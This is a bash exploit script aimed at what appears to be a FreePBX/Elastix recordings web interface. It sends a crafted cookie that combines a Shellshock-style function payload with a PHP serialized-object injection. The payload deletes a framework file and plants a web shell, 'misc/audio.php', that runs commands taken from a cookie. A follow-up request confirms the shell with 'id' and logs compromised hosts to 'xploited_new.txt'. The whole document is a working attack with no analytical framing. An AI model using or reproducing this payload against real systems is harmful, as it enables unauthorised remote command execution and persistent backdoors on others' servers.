#!/bin/bash

curl -ks -m20 'http://127.0.0.1/recordings/index.php' --cookie "ari_lang=() { :;};php -r 'set_time_limit(0);unlink('page.framework.php');file_put_contents('misc/audio.php', '<?php if(\$_COOKIE[\"lang\"]) {system(\$_COOKIE[\"lang\"]);}die();?>");';ari_auth=O:8:"DB_mysql":6:{s:19:"_default_error_mode";i:16;s:22:"_default_error_options";s:9:"do_reload";s:12:"_error_class";s:4:"TEST";s:13:"was_connected";b:1;s:7:"options";s:3:"123";s:3:"dsn";a:4:{s:8:"hostspec";s:9:"localhost";s:8:"username";s:4:"root";s:8:"password";s:0:"";s:8:"database";s:7:"trigger";}};elastixSession=716ratk092555gl0b3gtvt8fo7;UICSESSION=rporp4c88hg63sipssop3kdmn2;ARI=b8e4h6vfg0jouquhkcblsouhk0" --data "username=admin&password=admin&submit=btnSubmit" >/dev/null

if curl -ks -m10 "http://127.0.0.1/recordings/misc/audio.php" --cookie "lang=id" | grep asterisk >/dev/null;then echo "127.0.0.1/recordings/misc/audio.php" | tee -a xploited_new.txt;fi
